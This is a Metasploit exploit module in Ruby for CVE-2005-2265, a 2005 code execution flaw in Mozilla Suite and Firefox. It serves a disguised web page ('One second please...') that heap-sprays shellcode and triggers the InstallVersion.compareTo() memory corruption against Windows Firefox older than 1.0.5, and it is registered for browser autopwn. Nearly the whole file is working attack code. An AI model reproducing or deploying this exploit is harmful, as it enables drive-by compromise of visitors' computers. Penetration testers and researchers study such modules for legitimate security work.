##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML

	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name => HttpClients::FF,
		:ua_ver => "1.0",
		:os_name => OperatingSystems::WINDOWS,
		:javascript => true,
		:rank => NormalRanking, # reliable memory corruption
		:vuln_test => "if (typeof InstallVersion != 'undefined') { is_vuln = true; }",
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mozilla Suite/Firefox InstallVersion->compareTo() Code Execution',
			'Description'    => %q{
				This module exploits a code execution vulnerability in the Mozilla
			Suite, Mozilla Firefox, and Mozilla Thunderbird applications. This exploit 
			module is a direct port of Aviv Raff's HTML PoC.

			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Aviv Raff <avivra [at] gmail.com>', # Initial PoC
					'hdm',   # msf port
					'egypt', # stability improvements
				],
			'Version'        => '$Revision$',
			'References'     => 
				[
	  				['BID',   '14242'],
					['OSVDB', '17968'],
					['CVE',   '2005-2265'],
					['URL',   'http://www.mozilla.org/security/announce/mfsa2005-50.html'],
					['URL',   'http://aviv.raffon.net/2005/12/11/MozillaUnderestimateVulnerabilityYetAgainPlusOldVulnerabilityNewExploit.aspx'],
				],
			'Payload'        =>
				{
					'ExitFunc' => 'process',
					'Space'    => 400,
					'BadChars' => "\x00",
				},
			'Targets'        =>
				[
					[ 'Firefox < 1.0.5 Windows', 
						{
							'Platform' => 'win',
							'Arch' => ARCH_X86,
							'Ret' => 0x0c0c0c0c,
							
						}
					],
				],
			'DisclosureDate' => 'Jul 13 2005'
			))
	end

	def on_request_uri(cli, request)
	
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
		send_response_html(cli, generate_html(p), { 'Content-Type' => 'text/html' })
		
		# Handle the payload
		handler(cli)
	end
	
	def generate_html(payload)

		enc_code = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		enc_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(target.arch))
		#enc_nops = Rex::Text.to_unescape("\x90"*(4), Rex::Arch.endian(target.arch))
		
		spray_to = sprintf("0x%.8x", target.ret)
		spray_slide = Rex::Text.to_unescape( [target.ret].pack('V'), Rex::Arch.endian(target.arch) )

		return %Q|
<html>
<head>
<!-- 
     Copyright (C) 2005-2006 Aviv Raff (with minor modifications by HDM for the MSF module)
     From: http://aviv.raffon.net/2005/12/11/MozillaUnderestimateVulnerabilityYetAgainPlusOldVulnerabilityNewExploit.aspx
     Greets: SkyLined, The Insider and shutdown 
-->
	<title>One second please...</title>
	<script language="javascript">

		function BodyOnLoad() 
		{
			location.href="javascript:void (new InstallVersion());";
			CrashAndBurn();
		};

		// The "Heap Spraying" is based on SkyLined InternetExploiter2 methodology
		function CrashAndBurn() 
		{
			// Spray up to this address
			var heapSprayToAddress=#{spray_to};

			// Payload - Just return..
			var payLoadCode=unescape("#{enc_code}");

			// Size of the heap blocks  
			var heapBlockSize=0x400000;
			
			// Size of the payload in bytes
			var payLoadSize=payLoadCode.length * 2; 
			
			// Caluclate spray slides size
			var spraySlideSize = heapBlockSize-(payLoadSize+0x38); // exclude header

			// Set first spray slide ("pdata") with "pvtbl" fake address
			var spraySlide = getSpraySlide(unescape("#{spray_slide}"),spraySlideSize); 

			// Spray the heap
			heapBlocks=(heapSprayToAddress-0x400000)/heapBlockSize;

			memory = new Array();
			for (i=0;i<heapBlocks;i++) 
			{
				memory[i] = spraySlide + payLoadCode;
			}

			// Set address to fake "pdata".
			var eaxAddress = #{spray_to};
			
			//	This was taken from shutdown's PoC in bugzilla
			// struct vtbl { void (*code)(void); };
			// struct data { struct vtbl *pvtbl; };
			//
			// struct data *pdata = (struct data *)(xxAddress & ~0x01);
			// pdata->pvtbl->code(pdata);
			//
			(new InstallVersion).compareTo(new Number(eaxAddress >> 1));
		}

		function getSpraySlide(spraySlide, spraySlideSize) {
			while (spraySlide.length*2<spraySlideSize) 
			{
				spraySlide+=spraySlide;
			}	
			spraySlide=spraySlide.substring(0,spraySlideSize/2);
			return spraySlide;
		}

// -->
	</script>
</head>
<body onload="BodyOnLoad()">
</body>
</html>
		|
	end

end
